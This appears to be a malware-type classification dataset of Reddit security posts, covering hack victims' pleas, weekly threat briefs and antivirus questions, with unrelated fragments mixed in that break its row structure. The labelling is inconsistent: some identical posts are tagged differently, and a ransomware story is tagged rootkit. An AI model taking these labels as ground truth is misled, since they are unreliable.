3,"Need objective help/reassurance after a nasty hack.. Hey.

So my gf downloaded a trojan the other day.  I think it was a session stealer, since it instantly got into her gmail (I believe it was open, or at least chrome was).

They then used the gmail to set the email of her discord account to some other email so we were essentially locked out at that point.

I noticed under the google account ""sessions"" it said the session was in some foreign country, but it also said it was \_your current session\_.  I quickly forced that session to sign out, unplugged the PC then on a clean laptop I had her change her Gmail password.  After that, the chaos stopped entirely.

I imagine it stopped after I forced them out and severed their connection, not sure if changing the Gmail password did anything.  I also made sure they didn't set up any forwarding addresses.  They were doing this somewhat manually, as I saw emails going into the trash.  They also were talking on the account and it wasn't some bot.  They manually were configuring stuff on the discord, and it was seemingly too slow for a script.

Now, here's the really hard part.  I have not been able to sleep and I am kept up by mini-nightmares of getting notifications on my phone that I'm being hacked or my account is being stolen because she had signed in as me at some point or another.  It was forever ago, but she did sign in.

My main fears now are this:

\- they have all the autofill/password data from the chrome browser.  This is mitigated I guess after we went and manually changed and enabled google auth for all the accounts that profile might have had.

\- they have credit card info.  I've frozen the card and requested a new one asap.  They did charge the card using the discord account which I assume they then ""gift"" to basically lander the money.

\- somehow they will get into my gmail account despite it having google auth, device push notifications and no SMS or recovery email.

I \_really\_ need to get some sleep tonight.  My grandfather is in absolutely poor health and my car is having issues so this just sorta pushed me over the edge and I just need a small win here.  Someone that knows wtf is up (when it comes to viruses) to tell me I've done what I could and I'm probably ok and I'm not going to have my bank account drained in the middle of the night.  

If that's a possibility, please tell me what I can do to stop that.

I gotta be honest, I download some pretty wild things on my computer but not that weird (mostly from official websites) but now my instagram got hacked and some elon musk scams got posted using it (story & post) and I never click on phishing links or put my password anywhere so I guesses it was from my computer since I also have an Iphone which is crazy secure. So I went and downloaded malwarebytes and it eliminated a few ""trojans"" here and there (most of them were probably not trojans) but now I took a look in the task manager and found something pretty weird.

8,"Week 28 in Brief: Revolut's $20M Loss, ScarletEEL's Cloud Exploits, US Govt. Emails Compromised, Windows Malicious Drivers and ToiToin Ransomware Targeting Banks. Every Monday, I release ""[Mandos Brief](https://blog.mandos.io)"" - a compact yet comprehensive review of the five most significant cybersecurity events from the previous week. This includes both brief summaries and analysis. The aim is to provide an informative resource to keep cybersecurity community well-informed and raise awareness among newcomers in the field.

Here's a recap of the past week:

**Revolut's $20 Million Lesson: The Cost of a Payment System Exploit**

- Cyber criminals exploited a flaw in Revolut's payment systems, stealing more than $20 million of the company's funds.
- The breach was due to discrepancies between Revolut's US and European systems, causing funds to be erroneously refunded when transactions were declined.
- The issue was first detected in late 2021, but before it could be fixed, criminal groups leveraged the loophole, making expensive purchases that would be declined and then withdrawing the refunded amounts.
- The exact technical details associated with the flaw are currently unclear, but the mass fraud scheme resulted in a net loss of about $20 million for Revolut.

**ScarletEEL's Exploits Terraform, Kubernetes, and AWS**

- ScarletEEL, a sophisticated cloud operation, exploited a containerized workload and escalated privileges into an AWS account to steal proprietary software and credentials.
- The attack started from a compromised Kubernetes container and spread to the victim's AWS account, demonstrating the attacker's knowledge of AWS cloud mechanics such as EC2 roles, Lambda serverless functions, and Terraform.
- The attacker used a Terraform state file to attempt to pivot to other connected AWS accounts, aiming to spread their reach throughout the organization.
- Cyberattacks in the cloud have increased by 56% over the past year, with motives ranging from exfiltrating sensitive data, creating new resources for cryptomining, and more espionage-focused motives.

**US Government Emails Compromised by China-Based Espionage Group**

- US Government Emails Compromised by China-Based Espionage Group.
- The cyber attackers exploited a flaw in Microsoft's cloud email service, gaining access to accounts since May 2023.
- The State Department and Commerce Department were among the affected agencies.
- Microsoft, upon being alerted by the US government, mitigated the attack, although it's unclear if any sensitive data was exfiltrated.

**Windows Policy Loophole Is A Gateway for Malicious Drivers**

- Cyber attackers are exploiting a Windows policy loophole to forge signatures on kernel-mode drivers.
- The loophole allows the loading of drivers signed before July 29, 2015, using open-source tools such as HookSignTool and FxxkCertVerifyTimeValidity.
- The policy was designed to maintain compatibility with older software, allowing them to load older drivers in Windows 10 and Windows 11 without Microsoft's safety review.
- Microsoft has blocked the offending drivers and suspended the developer program accounts involved in the incident.

**ToiToin: The Rising Threat to Latin American Banking**

- ToiToin is a new Windows-based banking trojan active since 2023, primarily targeting businesses in Latin America.
- The trojan employs a multistage infection chain and custom-made modules to carry out malicious activities such as injecting harmful code into remote processes, circumventing user account control, and evading detection by sandboxes.
- ToiToin can collect data from installed web browsers and system information. It also checks for Topaz Online Fraud Detection (OFD), an anti-fraud module embedded into financial platforms in the Latin America region.
- The infection begins with a phishing email, leading to a zip archive hosted on an Amazon EC2 instance. The archive contains a downloader executable that sets up persistence and communicates with a remote server to retrieve next-stage payloads.",trojan,malware type

10,"My wife's computer was sabotaged, I'm trying to identify the tool used.... This isn't a call for support, rather it's helping me identify what tool or malware or whatever was used on my wife's computer. It's a shot in the dark - something that someone might have seen before and say like - oh yeah that's a variant of win32/killdisk or whatever. I'll give you the scenario and I'll upload pictures if I can. Thanks so much for taking a few minutes to read this.

My wife's computer had solid anti-virus/malware/etc. protection, but as it was a home computer, she never locked it or anything. It's was just a Windows 10 custom rig. After spending a weekend with a few people at our house, we noticed, after they left, that the computer was inoperable. After digging into it, it looked like an internal power surge from the power supply. This was a corsair platinum with 300 watts of overhead beyond max possible load. But anything can happen so I didn't think much about it.

However, later, I tried to recover the drives (there were five in there) The SSD was fried, I'd need to buy another one and so some crazy stuff to save it, assuming i had the skills to do it, assuming the memory board was stable, assuming that there isn't an internal encryption mechanism... But I did have a WD Raptor in there that survived the shock. It's a sturdy beast. So I tried some file recovery on it, there were some old pictures, not that important, that I hadn't backed up. However, almost everything was in the Recycle Bin. But what really shocked me was that while trying to recover the images, they're all overwritten by what look like super low resolution crappy DVD menus from some 3rd rate photography studio. Is this is a known criminal ware / malware / data wiping tool / worm / trojan horse \[...\] ? I attached some images, this is some weird stuff.",trojan,malware type

Thankfully this client has end point and server BCDS backup services with us, so we checked the logs and knew they were in the clear.

Ransomware attacks are definitely on the rise. We're telling everyone who will listen that we will never use anything other than Unitrends BCDR. It's so easy, and fast and it just works! Regularly scheduled backups really do seem to be the best defense against cybercrime. Monitoring and threat detection are great. But when something goes wrong, if we didn't have Unitrends we would have probably lost this client, and they would be screwed!  


We got the call this morning. The tech in charge had never done a restore before and yet within less than 20 minutes she was able to call support, make a VPN connection and boot the VMs. Client is back in business and the system runs just fine over a simple coax circuit. Now we have time to worry about how to fix everything permanently without any pressure.

37,"Why VPN losing its relevance in the world of sophisticated Cyber Attacks ?. For a technology or product category to take shape and go mainstream, it has to offer clear outcomes to most users, which in turn triggers a virtuous cycle for the entire ecosystem.

Many enterprises have adopted Zero Trust Network Access(ZTNA) during COVID-19 WFH times considering the broad Zero Trust Architectures virtues. Are they clear on the possible outcomes of the initiatives?

I'm not sure, from my varied interactions with CIOs & CISOs. Here is a jargon-free take on ZTNA Outcomes compared to VPN.

Comments and inputs are most welcome!

|Outcome Parameters|VPN|ZTNA|
|:-|:-|:-|
|Risk of Data breaches and ransomware attacks.|High - Due to higher attack surface due to the Perimeter-based trust model.|Very Low - Hugely Reduced Attack surface due to Granular Access based on Zero Trust.|
|Staff User Experience|Poor - Higher latency due to traffic hairpinning at the VPN Gateway Data Center or HQ. Frequent Sign-ons lead to Staff Fatigue. |improved Experience - Lower latency traffic & packet loss due to Direct, Peer to Peer & mesh connectivity | Single Sign On and adaptive authentication delights Staff users.|
|Availability & Scalability|Challenging - Lower Scalability and Redundancy VPN gateway setup constraints.|Built-in Scalability and Redundancy - Cloud-based auto-scaling and redundancy Not dependent on central VPN gateways.|
|Ease of deployment & management|Time-consuming, Manual & Error-Prone - Based on expensive Hardware Appliances - Not software-defined approach.|Deployment in Minutes with full automation - Easy REST API Orchestration, custom workflows - No need for Gateway Hardware deployment. |
|Cost Effectiveness|Higher cost -Considering the need to deploy a central VPN gateway, backhaul bandwidth, and Opex. |Lower TCO Simple per-user license subscription on-demand. |
|Compliance with Cyber Security Framework|Not Compliant - Provides basic secure remote access |Supports ISO 27001 and similar certification audits through deeper audit logs and optional forensics|

I've recently completed a research article that dives deep into the world of ransomware, focusing on its evolution, tactics, and mitigation strategies.

**Key Insights**:

1. **Evolutionary Patterns**: How ransomware has transformed from a simple locker mechanism to employing advanced evasion techniques.
2. **Tactics**: An in-depth analysis of the methods used by modern ransomware groups to penetrate networks and evade detection.
3. **Mitigation**: Practical recommendations for organizations to protect themselves against ransomware attacks.

I believe this research can be invaluable for cybersecurity professionals and enthusiasts. Feedback, discussions, and criticisms are welcome as I believe they can further refine our collective understanding of this threat.

One thing I'm noticing is that there is a ton of link rot and some of these archives are multiple hundred GB.  Most of the leaks I actually dive into are also fairly limited and rarely ever the huge troves you see written about.

My question is, where are these groups storing these 50+ GB archives?  Obviously they are accessible from TOR but that is space and bandwidth that someone has to pay for.  If it was 50MB then I could believe it was being hosted by a hacked company but I feel like even the smallest company is going to know where a 50GB file is being accessed regularly on their network.",ransomware,malware type

The executable responsible for updating Lightshot gets deleted right after install.

I've read several Ransomware analysis and it looks like a lot of TA do Lateral Movement with RDP. Which is cool, I get it, but AFAIK it's not possible to code RDP commands into a script, and I find it hard to believe that ransomware actors spread ""manually"" through the internal network.   
In fact, these same Ransomware reports always say that the final payload spreads automatically through the net, which makes sense but - which is which?

I'm sure I'm missing something trivial because everyone seem to agree with this, but I don't know what, so here are my questions: 

1) is it possible to use RDP via script?   
2) does Ransomware operate manually during the Lateral Movement stage?   
3) are there two different Lateral Movement stages (but I guess number 2 would still be a question  here)?

Now it seems like most of the VMs are just a little bit screwed up with corrupt files that can't be deleted on the file server, IIS servers that would never work again even after reinstalling IIS (had to spin up a brand new server and migrate), etc.

Is this common for restored VMs to not come back as their old selves again? I have such huge trust issues now, I don't even know if I trust my snapshots.

I also noticed that any VM created via Clone prior to the attack is completely and utterly screwed up after it was restored - like utterly unusable with corrupt files.

We restored the VMs from 2 weeks prior to any detection of invasion, just to be sure we weren't getting tainted assets.

        -Block Process creations originating from PSExecs and WMI
        -Block executable files from running unless they meet a prevalence, age, or trusted list criterion
        -Use advanced protection against ransomware
        -Block all Office applications from creating child processes
    
        Below are the guids listed and 1 means enabled and 2 means enabled and locked so user can not change it.
    
        To have the log analytics part running an Azure Monitoring Agent or Microsoft Monitoring Agent needs to be deployed to the devices. These Agents have shared keys and you need to 
        paste the Primary key. Workspace ID is the id of the workspace you want to send the logs to.

69,"Week 28 in Brief: Revolut's $20M Loss, ScarletEEL's Cloud Exploits, US Govt. Emails Compromised, Windows Malicious Drivers and ToiToin Ransomware Targeting Banks. Every Monday, I release ""[Mandos Brief](https://blog.mandos.io)"" - a compact yet comprehensive review of the five most significant cybersecurity events from the previous week. This includes both brief summaries and analysis. The aim is to provide an informative resource to keep cybersecurity community well-informed and raise awareness among newcomers in the field.

Here's a recap of the past week:

**Revolut's $20 Million Lesson: The Cost of a Payment System Exploit**

- Cyber criminals exploited a flaw in Revolut's payment systems, stealing more than $20 million of the company's funds.
- The breach was due to discrepancies between Revolut's US and European systems, causing funds to be erroneously refunded when transactions were declined.
- The issue was first detected in late 2021, but before it could be fixed, criminal groups leveraged the loophole, making expensive purchases that would be declined and then withdrawing the refunded amounts.
- The exact technical details associated with the flaw are currently unclear, but the mass fraud scheme resulted in a net loss of about $20 million for Revolut.

**ScarletEEL's Exploits Terraform, Kubernetes, and AWS**

- ScarletEEL, a sophisticated cloud operation, exploited a containerized workload and escalated privileges into an AWS account to steal proprietary software and credentials.
- The attack started from a compromised Kubernetes container and spread to the victim's AWS account, demonstrating the attacker's knowledge of AWS cloud mechanics such as EC2 roles, Lambda serverless functions, and Terraform.
- The attacker used a Terraform state file to attempt to pivot to other connected AWS accounts, aiming to spread their reach throughout the organization.
- Cyberattacks in the cloud have increased by 56% over the past year, with motives ranging from exfiltrating sensitive data, creating new resources for cryptomining, and more espionage-focused motives.

**US Government Emails Compromised by China-Based Espionage Group**

- US Government Emails Compromised by China-Based Espionage Group.
- The cyber attackers exploited a flaw in Microsoft's cloud email service, gaining access to accounts since May 2023.
- The State Department and Commerce Department were among the affected agencies.
- Microsoft, upon being alerted by the US government, mitigated the attack, although it's unclear if any sensitive data was exfiltrated.

**Windows Policy Loophole Is A Gateway for Malicious Drivers**

- Cyber attackers are exploiting a Windows policy loophole to forge signatures on kernel-mode drivers.
- The loophole allows the loading of drivers signed before July 29, 2015, using open-source tools such as HookSignTool and FxxkCertVerifyTimeValidity.
- The policy was designed to maintain compatibility with older software, allowing them to load older drivers in Windows 10 and Windows 11 without Microsoft's safety review.
- Microsoft has blocked the offending drivers and suspended the developer program accounts involved in the incident.

**ToiToin: The Rising Threat to Latin American Banking**

- ToiToin is a new Windows-based banking trojan active since 2023, primarily targeting businesses in Latin America.
- The trojan employs a multistage infection chain and custom-made modules to carry out malicious activities such as injecting harmful code into remote processes, circumventing user account control, and evading detection by sandboxes.
- ToiToin can collect data from installed web browsers and system information. It also checks for Topaz Online Fraud Detection (OFD), an anti-fraud module embedded into financial platforms in the Latin America region.
- The infection begins with a phishing email, leading to a zip archive hosted on an Amazon EC2 instance. The archive contains a downloader executable that sets up persistence and communicates with a remote server to retrieve next-stage payloads.",ransomware,malware type

86,"Got ransomware attacked last year and I'm trying to figure how it happened and how I could prevent it. Forgive my formatting I am on phone. 


Hello sorry if this seems like a vent but I have to get it off my chest to feel better, last year I got hit by a ransomware attack that caused me great anxiety. When I got it I looked everywhere about it on the internet and never found anything resembling the ransom letter I got. 


It's started when one day I suddenly got logged out of windows while playing a game. I got back in and ran malwarebytes but it didn't find anything. The next day I opened my pc and went to get breakfast, I came back to seeing it logged out again but this time when I opened it I saw CMD open with the title (444.exe). I immediately ran malwarebytes again and it still didn't find anything, so I went and tried other scanners such as hitman pro that also didn't find anything. I saw a thread about running rootkit scanning on malwarebytes and it finally found something. 


I made sure windows defender was on and even got a malwarebytes subscription just in case something else happens and went out to get lunch. I come back to see windows logged out Again. But this time all my files got encrypted, malwarebytes got uninstalled and that's how I found the ransom note. 


I decided to factory reset, but also fresh installed windows from USB. Almost a year later nothing suspicious has happened yet but as I'm getting close to the anniversary I'm feeling more and more anxious. 


Things to note, I was in an internship that had me build a simple game on Unity with multiplayer using Photon engine. Other than that, I had downloaded a couple of mods from nexusmods that are deemed safe by them. And the following link is closest thing I've found to any semblance of info about the 444.exe file I have https://www.greatis.com/appdata/d/_/444.exe.htm


In the end, I just need some proper tips on how to further protect myself from such attacks and how to identify any security problems that I might be facing.

- **April 2, 2021**: [The Dutch Institute for Vulnerability Disclosure \(DIVD\) identifies seven vulnerabilities](https://csirt.divd.nl/2022/04/04/Kaseya-VSA-Full-Disclosure/) in Kaseya's VSA software and initiates the process of responsible disclosure with Kaseya.

- **July 2, 2021**: The REvil group initiates a ransomware attack exploiting one of the vulnerabilities that DIVD was in the process of disclosing. The attack targets Managed Service Providers (MSPs) and their clients, spreading across multiple countries. [Kaseya acknowledges the attack](https://helpdesk.kaseya.com/hc/en-gb/articles/4403584098961-Incident-Overview-Technical-Details), shuts down its SaaS servers, and advises on-premises customers to immediately shut down their VSA servers.

They also have a[ blog post](https://www.huntress.com/blog/rapid-response-kaseya-vsa-mass-msp-ransomware-incident) being constantly updated during the incident

- **July 3, 2021**: DIVD confirms that the attackers used one of the vulnerabilities they had identified and were in the process of disclosing to Kaseya.

- **July 4, 2021**: [REvil group demands $70 million](https://www.bleepingcomputer.com/news/security/revil-ransomware-asks-70-million-to-decrypt-all-kaseya-attack-victims/) in Bitcoin in exchange for a universal decryptor.

- **July 6, 2021**: [Huntress Security successfully reproduced](https://www.huntress.com/blog/rapid-response-kaseya-vsa-mass-msp-ransomware-incident) the Kaseya VSA exploits used

- **July 11, 2021**: Kaseya receives a decryptor that enables victims to recover their data. At the time it was not clear who provided the decryptor or whether a ransom was paid. Later we learned the[ FBI had the keys](https://www.zdnet.com/article/fbi-decision-to-withhold-kaseya-ransomware-decryption-keys-stirs-debate/) but delayed giving them as not to tip off REvil that they had infiltrated their systems.

**Identity Crisis in the Cloud: Storm-0558 and the Forged Access Key**   
  
A recent disclosure by Microsoft and CISA revealed a significant security incident impacting multiple Exchange Online and Outlook.com customers using a forged access key. Researchers now warn that the compromised key had more extensive capabilities, potentially endangering sensitive information across various Azure Active Directory applications.   
  
  
**Redis on the Run: P2PInfect Worm Attacks**   
  
P2PInfect, a dangerous new worm, has been discovered targeting Redis, an open-source database application on Linux and Windows cloud systems. With auto-updating capabilities and exploitation of a critical vulnerability, this worm poses a significant threat. We urge organizations to stay vigilant and safeguard their infrastructure.   
  
  
**Apple Combats Zero-Day Zero-Click Campaign**   
  
Apple has released crucial security updates for macOS, iOS, iPadOS, tvOS, watchOS, and the Safari web browser. These updates address multiple vulnerabilities, including a critical zero-day kernel flaw that could potentially be exploited by cyber attackers. Ensure your devices are up to date to stay protected.   
  
  
**MikroTik Vulnerability Emerges from the Past**   
  
MikroTik RouterOS Long-term versions prior to 6.49.8 are vulnerable to CVE-2023-30799 which was originally discovered in June of 2022 and was thought to only affect one hardware version due to limitations in the original exploitation proof of concept. Recent research shows that it is more severe and far-reaching than originally thought.   
  
  
**Nitrogen's Malvertising Mayhem: When Ads Go Rogue!**   
  
Threat actors are using a malvertising campaign named Nitrogen which uses search engine ads to lure users into downloading fake malicious software instead. The campaign primarily targets technology and non-profit organizations in North America, impersonating popular software applications like AnyDesk and Cisco AnyConnect VPN to gain initial access into corporate networks for data theft and cyberespionage.

97,"RHEL GlusterFS replacement for WORM. Hi everyone,

Hit a bit of a roadblock and looking for alternatives. We recently got a quotation through for a renewal from RHEL / RHGS and we've noticed an abnormal increase in price for our RHEL / RHGS deployments and Gluster Storage licensing seems to be a tad more restrictive to the point it may impact a small number of our operations using Centos. We currently use RHGS (Red Hat Gluster Storage) + Centos extensively.

The cost change is this, therefore support costs more.  
Red Hat Gluster Storage will reach end of support life date of December 31, 2024 [https://access.redhat.com/support/policy/updates/rhs](https://access.redhat.com/support/policy/updates/rhs) 

Which seems to be where the licensing increase is coming from, we have not been advised of any replacement which leads onto the second change.

The other change from the wording is that we have the restriction is that if we're using RHEL then we can't use any third party variations of Gluster without a license- but it's very unclear if that includes or means Centos, Rocky etc. At the moment I can't find any information online regarding this change and also it isn't included in our licensing portal. Only on the RHGS licensing agreement and renewal so we've reached out to seek more clarification what is exactly meant.

We're looking for either Linux or even appliance based. Taken a look at TrueNAS and Unraid but spending today looking if there are better options out there that people are using. A GUI or frontend would be a bonus as the users generally use it for some legal holds (not strictly required but they like having the option to lock individual files from editing).

We also are looking at Ceph, Synology, and a few others. Ideally if they support WORM natively.

If anyone has any experience or opinion it would be greatly appreciated. Thanks.

104,"Coding a heuristic antivirus in Python. Hi, everyone, I'm looking to code an antivirus in Python for fun and was wondering if anyone could answer some questions.

I under the most basic feature of an AV is that it just walks through the filesystem and flags files if they match a known signature. However, I am more curious about implementing heuristic AV techniques that can also detect unknown malware, including user-mode rootkits, in Windows systems.

**Some questions:**

* Would it be possible to code an anti-rootkit tool like [GMER](http://www.gmer.net/) without a driver? Mainly for detecting unknown user-mode malware, not kernel / advanced stuff.
* Can I access kernel functions somehow to find hidden processes (unlinked from task manager), hidden registry keys, etc. in an online system, similar to this [Volatility plugin](https://github.com/volatilityfoundation/volatility/wiki/Command-Reference#psscan)?
* Would it be possible to somehow print all global keyboard hooks, for example, and the processes associated with those hooks, as a method of detecting keyloggers? Can Python do stuff like this by itself and with admin privileges only?

Anyway, I already understand that Python isn't the best choice for a project like this, especially for performance if it's constantly analyzing the system. However, the tool I'm interested in coding is more simple and would mostly just be a one time scan of the system that users could occasionally run, as opposed to something that's always running and analyzing every process and file.

I tried to do a lot of research but couldn't find any examples, and 99% of AV software on GitHub that I've seen relies on signature scanning techniques, and at most use YARA rules or something, and almost none of those are coded in Python either. Was just wondering if it would be possible and what Python libraries / projects I should look into and if anyone has any other advice for a project like this.

Thanks in advance for anyone who can help / give advice.",rootkit,malware type
105,"Got ransomware attacked last year and I'm trying to figure how it happened and how I could prevent it. Forgive my formatting I am on phone. 


Hello sorry if this seems like a vent but I have to get it off my chest to feel better, last year I got hit by a ransomware attack that caused me great anxiety. When I got it I looked everywhere about it on the internet and never found anything resembling the ransom letter I got. 


It's started when one day I suddenly got logged out of windows while playing a game. I got back in and ran malwarebytes but it didn't find anything. The next day I opened my pc and went to get breakfast, I came back to seeing it logged out again but this time when I opened it I saw CMD open with the title (444.exe). I immediately ran malwarebytes again and it still didn't find anything, so I went and tried other scanners such as hitman pro that also didn't find anything. I saw a thread about running rootkit scanning on malwarebytes and it finally found something. 


I made sure windows defender was on and even got a malwarebytes subscription just in case something else happens and went out to get lunch. I come back to see windows logged out Again. But this time all my files got encrypted, malwarebytes got uninstalled and that's how I found the ransom note. 


I decided to factory reset, but also fresh installed windows from USB. Almost a year later nothing suspicious has happened yet but as I'm getting close to the anniversary I'm feeling more and more anxious. 


Things to note, I was in an internship that had me build a simple game on Unity with multiplayer using Photon engine. Other than that, I had downloaded a couple of mods from nexusmods that are deemed safe by them. And the following link is closest thing I've found to any semblance of info about the 444.exe file I have https://www.greatis.com/appdata/d/_/444.exe.htm


In the end, I just need some proper tips on how to further protect myself from such attacks and how to identify any security problems that I might be facing. 


TL:DR I got ransomwared, not 100% sure from where or why. Need tips on how to protect myself in the future.",rootkit,malware type
106,"How would you know if you're being affected by 0-day (Firefox)?. I just installed Firefox after using Chrome for a long time because of Google's ethics. I got it all set up, was browsing the web, saw an embedded Youtube link. I pressed play on it, and all of a sudden my monitor flashes off and on, my keyboard turns off and on, and the Windows sound for detecting a new device is heard.

This has never happened before, and was incredibly odd. If an undetected rootkit of a sort was installed through way of an 0-day Firefox video display exploit, this is the sort of behavior I might expect to see.

How can we know if this sort of thing is happening behind the scenes, if its only purpose is to sit there and collect telemetry (visual data and certain keyboard activity), and through encrypted channels send that data back to Google (or anyone else, really). There would be countless ways to do-so without being detectable from a packet sniffing perspective as well, along with clever disguising techniques (embedding data in seemingly normal requests, spreading it out over multiple payloads, injecting it into other authentic activity or protocol communication, etc).

What sort of protection do we have, if any, or do we just need to cross our fingers? Are there any good ways to limit the exposure to this sort of thing, or is it just a matter of sophistication before there's nothing you can do?

For the record, I fully acknowledge that this may have just been a coincidence (or some other issue), and that's probably a far more likely reason, but this still deserves thought as a general principle regardless and I'm curious to hear about mitigations and detection.",rootkit,malware type

Lately her big go-to site is called Pulsz, where she has won a little bit here and there. Payouts are handled by another company called Prizeout.

She got an email from an imposter address claiming to be Prizeout, saying that she won over 1000 dollars in gift cards. She enters into these kind of things a lot, so she assumed it was real.

She clicked on a link from the email that took her to a website that required her to input a code to claim her gift cards, and received digital gift card codes in return. 

The weird part here is that the gift card numbers worked. She put half towards a Best Buy card, and half towards Door Dash. The codes were accepted on the respective apps and the balance was applied.

She also sent an email to me with a ""click here and claim your code"" for Door Dash for $100 and when I applied the code to my Door Dash app, it accepted it and applied the credit to my account.

However, she got follow up emails, once again telling her she won more gift cards. The original email was for $1000, the follow ups were for about $900 and $100.

After the follow up emails, she got suspicious of the different amounts and contacted the Pulsz customer support, and gave them all the info.

The customer support person explained that the email address used was not one of theirs, and that they never handled prizes and giveaways in this manner.

I figured this means that the links from the email to the prize claim site were made to install some kind of malware or spyware after clicking, because they never asked for any personal information directly, only to input a code that was included in the email. No putting in account names or passwords or anything like that.

Activists say that tech firms could become complicit in Saudi surveillance and repression. 

  
Firms including Microsoft and Google are creating cloud storage centers in the kingdom. 

  
But Saudi Arabia has weak privacy laws and a track record of persecuting dissidents. 

&#x200B;

&#x200B;

At a lavish conference in Riyadh, in February, representatives from some of the world's biggest tech companies gathered.   
  
The event was part of Crown Prince Mohammed bin Salman's ""Vision 2030"" plan to transform Saudi Arabia, best known for its oil reserves and ultraconservative interpretation of Islam, into a hub for tech and innovation.  
  
Technology bosses rubbed shoulders with Saudi officials and planners of Neom, the $1 trillion futuristic data-run megacity being built in the northwest of the kingdom that is the centerpiece of the crown prince's vision.  
  
Soon after, Saudi officials announced they had secured $9 billion in investment from the firms, including a $2 billion plan from computer and tech giant Microsoft to build a cloud storage facility in the kingdom.  
  
It followed a similar announcement from Google last year that it would create a cloud center in the kingdom.   
  
Saudi's ill-defined security laws  
But as tech firms rush to secure lucrative Saudi contracts, human rights activists are warning that Saudi officials could use the vast stores of digital information being stored in the kingdom to intensify its brutal persecution of dissidents.  
  
They are warning tech giants like Microsoft and Google that they could be forced to hand over private citizen data to Saudi hitmen.   
  
In a May report, Human Rights Watch warned that under Saudi law, security services are given sweeping powers to access data, and can compel companies to hand over private information deemed to have breached ill-defined and broad national security laws.  
  
It said that Google and Microsoft, two of the biggest tech firms in the world, are refusing to disclose how they will shield the privacy of data hosted in the kingdom.   
  
Data handed over a silver platter  
Marwa Fatafta, an analyst with digital rights group Access Now, described Saudi Arabia as a country with a ""dismal"" human rights record.  
  
""There are serious concerns around data protection, around privacy, around surveillance,"" she said. ""Have they really \[Google and Microsoft\] investigated how they plan to mitigate potential human rights abuses or privacy violations, building such infrastructure?""   
  
 ""A Google cloud center under Saudi's jurisdiction would basically serve our sensitive data on a silver platter to Saudi's top hitmen,"" Rewan Al-Haddad, campaign director for a shareholder group called S,umOfUs told the New York Post last year.   
  
Saudi surveillance

In recent years, Saudi authorities have ruthlessly pursued government critics on social media, using spyware to track exiled dissidents, and even reportedly infiltrating Twitter's headquarters to steal data.  
  
Recently, Saudi authorities jailed a woman, Fatima al-Shawarbi, for 30 years who criticized the Neom megacity project on Twitter. In 2020, Leeds University student, Salma al-Shehab, was given a 30-year jail sentence for criticizing the crown prince on the social media platform.   
  
Saudi Arabia can 'do want it wants'  
Professor Alan Woodward, a computer technology expert at the University of Surrey, said that Saudi authorities would potentially be able to access vast amounts of sensitive political information stored via the cloud.   
  
""The government can basically do what it wants,"" he said. ""And if you can imagine all the things that are put online it could be something quite edgy, it could be used against dissidents.""  
  
Countries such as Saudi Arabia, he said, often told companies that ""if you want to operate in this country, you've got to keep the data in this country. And that's for an obvious reason: So they could potentially access it.""  
  
Microsoft told Insider it remained committed to human rights, yet offered no concrete details on how it would safeguard data privacy while operating in a state that doesn't acknowledge it.   
  
""Respecting human rights is a core value of Microsoft. Our investment in the region will be consistent with Microsoft's commitment to protecting fundamental rights and includes a focus on responsible cloud practices including security, privacy, compliance, and transparency, as well as adherence to Microsoft's values and principles,"" a Microsoft spokesperson told Insider.   
  
A Google spokesperson pointed Insider to a statement on the company's website, saying that ""as the global landscape continues to evolve, we are committed to collaborating with human rights organizations and the broader technology industry to uphold human rights in every country where we operate.""  
  
James Lynch, a researcher at human rights organization Fairsquare, challenged Microsoft and Google to publish their human rights ""due diligence"" reports, aimed at assessing how they can ethically operate in a country with a poor human rights record.   
  
However, he said the companies refused to publish the reports and called on them to ""show us clearly how they plan to mitigate risks such as the Saudi authorities asking them for access to data.""  
  
Neom, a surveillance city   
A particular concern for human rights activists is Neom, the vast city Crown Prince Mohammed has commissioned to be built in the northeast of the kingdom. Saudi Arabia's sovereign wealth fund has earmarked $1 trillion to build the city, whose services, ranging from transport to air conditioning will be run on user data accessed through smartphones.   
  
In March, Insider reported on concerns that the data could be used in huge surveillance systems by Saudi authorities, to track and monitor residents in real time.   
  
It's a concern James urged Western firms planning on being involved in the creation of the city's digital infrastructure to address.   
  
""Tying in almost all data about the way people live and using that as the organizing principle of the city is extremely scary,"" said Lynch, in a country with at best opaque privacy laws and sweeping powers to suppress dissent.   
  
The planned design of 'The Line,' a large building with a mirrored surface that extends out across the desert toward the coast.  
Saudi Arabia's futuristic city in the desert hopes to accommodate 9 million people. NEOM  
Neither Google nor Microsoft would say whether they were involved in building Neom's digital infrastructure.   
  
But amid the concerns, there is also the question of whether Saudi Arabia would risk imperiling the investment it has pinned so much of its future on through using data stored in the kingdom.  
  
It's part of a balancing act analysts have told Insider Crown Prince Mohammed has long sought to perform, seeking to open up the kingdom to innovation and appear as a reformer, while maintaining his authoritarian powers to quash dissent.   
  
""I would take Neom's involvement positively, and perhaps that might tip one over into sort of looking at this with the glass half full and say, 'well, it's genuinely probably part of the kingdom's attempts to diversify and hence have more technology infrastructure in the country,"" said Woodward.

Hi there Linux community this is gonna be a lengthy post and I'm sorry about that but I really need to type this out because I'm so sick and tired of being treated like a pinata just because I'm new to Linux and I ask questions or if heavens forbid that I compare something in Linux to Windows.

# ~The Community~

The Linux community has had the worst people I had displeasure of interacting with ever and that is really saying something considering how internet is. Now for context because I have tried using Linux many times before (trying different distros) and I would always run into problems and so I would take it to the internet in search for an answer. More often than not I would be met with no solutions at all to my specific problem(s) and/or the solution is too complex for me to understand so  I would often found myself asking questions in the r/linuxquestions and r/linux4noobs only to be met with hostile responses, down votes, trolling, no comments and/or people making fun out of me **for trying to learn how it works**. Also if dare to mention Windows anywhere or make a comparison you'll get bombarded with nasty comments left, right and center. In what fantasy land are you guys living in where you think that everyone would know everything about Linux right off the bat? The reason to why Linux has grown so much over the past few years is because people are coming over from Windows so why the hostility towards Windows users in general? I see these types of comments on a daily basis from multiple platforms:

[...](https://preview.redd.it/x1sjudhl50ab1.png?width=750&format=png&auto=webp&v=enabled&s=d36c586872f17316eeef2d1073b07fe3ea47e6a3)

[I'm not defending anything here but this is just immature behavior.](https://preview.redd.it/viqqdrvm50ab1.png?width=740&format=png&auto=webp&v=enabled&s=1120b569533ad5c4ab94eb018f8c0ad85e65a732)

